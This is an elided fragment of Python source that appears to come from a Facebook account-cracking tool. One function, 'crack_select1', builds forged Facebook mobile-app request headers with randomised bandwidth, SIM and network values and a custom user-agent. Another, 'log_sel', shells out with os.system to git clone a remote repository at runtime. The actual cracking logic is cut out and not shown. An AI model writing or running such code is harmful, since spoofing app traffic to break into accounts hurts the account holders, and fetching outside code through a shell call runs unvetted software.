...
def log_sel():
	...
	if sel == "":
		...
		import os
		try:
			os.system("git clone https://github.com/Jteatidfhf/fcpro")
...
def crack_select1():
	...
	def main(arg):
		...
		try:
			...
			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent':_jteatidfhf,  'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
